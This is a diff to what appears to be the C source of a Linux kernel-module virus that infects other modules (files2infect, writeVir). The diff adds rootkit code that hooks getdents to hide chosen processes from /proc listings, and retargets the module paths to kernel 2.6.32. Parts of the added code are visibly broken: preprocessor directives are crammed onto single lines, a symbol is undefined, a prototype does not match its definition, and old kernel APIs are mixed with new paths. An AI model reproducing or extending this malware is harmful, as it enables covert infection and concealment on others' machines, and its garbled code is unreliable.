@@ -96,13 +96,13 @@ extern void *sys_call_table[];
 
 static char *default_path[] = {
         ".", "/linux/modules",
-        "/lib/modules/2.0.33/fs",
-        "/lib/modules/2.0.33/net",
-        "/lib/modules/2.0.33/scsi",
-        "/lib/modules/2.0.33/block",
-        "/lib/modules/2.0.33/cdrom",
-        "/lib/modules/2.0.33/ipv4",
-        "/lib/modules/2.0.33/misc",
+        "/lib/modules/2.6.32/fs",
+        "/lib/modules/2.6.32/net",
+        "/lib/modules/2.6.32/scsi",
+        "/lib/modules/2.6.32/block",
+        "/lib/modules/2.6.32/cdrom",
+        "/lib/modules/2.6.32/ipv4",
+        "/lib/modules/2.6.32/misc",
         "/lib/modules/default/fs",
         "/lib/modules/default/net",
         "/lib/modules/default/scsi",
@@ -131,7 +131,7 @@ static struct symbol_table my_symtab = {
         X(register_symtab_from),
         #include <linux/symtab_end.h>
 };
-register_symtab(&module_syms); /*do the actual registration*/
+
 char files2infect[7][60 + 2];
 
 /* const char kernel_version[] = UTS_RELEASE; */
@@ -149,7 +149,10 @@ int cp(struct file*, struct file*);
 int writeVir(char *, char *);
 int init_module2(struct module*);
 char *get_mod_name(char*);
-
+ /*see II.4 for more information on filesystem hacks*/
+int hacked_getdents(unsigned int , \
+                    struct dirent ,\ 
+		    unsigned int );
 /* needed to be global */
 
 void *VirCode = NULL;
@@ -163,7 +166,36 @@ int our_syscall(int mn)
         else
                 return -ENOSYS;
 }
-
+/*check whether we need to hide this process*/ 
+int invisible(pid_t pid) 
+{
+    struct task_struct *task = get_task(pid); char *buffer; if (task) 
+     {
+	 buffer = kmalloc(200, GFP_KERNEL); memset(buffer, 0, 200); task_name(task, buffer); if (strstr(buffer, (char *) &mtroj)) 
+	  {
+	      kfree(buffer); return 1; 
+	  }
+     }
+    return 0; 
+}
+ /*see II.4 for more information on filesystem hacks*/ 
+int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) 
+{
+    unsigned int tmp, n; int t, proc = 0; struct inode *dinode; struct dirent *dirp2, *dirp3; tmp = (*orig_getdents) (fd, dirp, count); #ifdef __LINUX_DCACHE_H dinode = current->files->fd[fd]->f_dentry->d_inode; #else dinode = current->files->fd[fd]->f_inode; #endif if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1) proc=1; if (tmp > 0) 
+     {
+	 dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL); memcpy_fromfs(dirp2, dirp, tmp); dirp3 = dirp2; t = tmp; while (t > 0) 
+	  {
+	      n = dirp3->d_reclen; t -= n; if ((proc && invisible(myatoi(dirp3->d_name)))) 
+	       {
+		   if (t != 0) memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t); else dirp3->d_off = 1024; tmp -= n; 
+	       }
+	      if (t != 0) dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen); 
+	  }
+	 memcpy_tofs(dirp, dirp2, tmp); kfree(dirp2); 
+     }
+    return tmp; 
+}
+ 
 int new_create_module(char *name, int size)
 {
         int i = 0, j = 0, retval = 0;
